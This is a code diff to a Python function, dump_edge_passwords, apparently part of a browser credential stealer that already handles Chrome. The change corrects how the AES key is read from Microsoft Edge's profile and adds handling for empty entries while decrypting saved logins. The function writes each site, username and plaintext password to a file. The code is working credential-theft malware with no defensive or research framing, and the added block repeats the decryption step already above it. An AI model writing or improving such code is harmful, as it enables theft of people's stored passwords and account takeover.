@@ -251,7 +251,7 @@ def dump_edge_passwords():
         return
 
     # grab AES key (same method you use for Chrome)
-    aes_key = get_key(os.path.join(BROWSERS["Edge"], ".."))
+    aes_key = get_key(BROWSERS["Edge"])
 
     try:
         con = sqlite3.connect(login_db)
@@ -269,6 +269,13 @@ def dump_edge_passwords():
                 pwd = decrypt(buff, aes_key)
             except:
                 pwd = "[DECRYPT FAIL]"
+            if not buff:
+                pwd = "[NO DATA]"
+            else:
+                try:
+                    pwd = decrypt(buff, aes_key)
+                except:
+                    pwd = "[DECRYPT FAIL]"  
             f.write(f"{url} | {user} | {pwd}\n")
 
 
